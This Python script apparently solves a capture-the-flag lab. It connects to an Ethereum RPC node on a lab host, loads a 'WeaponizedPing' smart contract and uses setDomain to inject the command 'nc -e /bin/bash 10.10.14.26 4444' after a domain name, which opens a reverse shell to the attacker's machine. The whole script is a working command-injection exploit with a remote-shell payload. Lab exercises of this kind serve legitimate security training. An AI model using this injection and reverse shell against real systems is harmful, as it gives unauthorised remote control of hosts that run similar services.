from web3 import Web3
import os, subprocess, time, json

address = '0x0e7Ab1AA3FA036C245Bf1Bd4B1c0Ca5fB5450256'

with open('WeaponizedPing.json') as f:
	contractData = json.load(f)

w3 = Web3(Web3.HTTPProvider('http://10.10.10.142:9810'))

#retrieve a default account we can use for the "from" value in transaction
w3.eth.defaultAccount = w3.eth.accounts[0]

#connect to the contract based on the address we retrieved from FTP
contract = w3.eth.contract(abi=contractData['abi'],address=address)
print (w3.eth.defaultAccount)

#print (w3.eth.getBlock('latest'))
#lets get the domain
print (contract.functions.getDomain().call())

#now lets modify it with setDomain()
contract.functions.setDomain('www.google.com;nc -e /bin/bash 10.10.14.26 4444').transact({'from':w3.eth.defaultAccount})
print (contract.functions.getDomain().call())
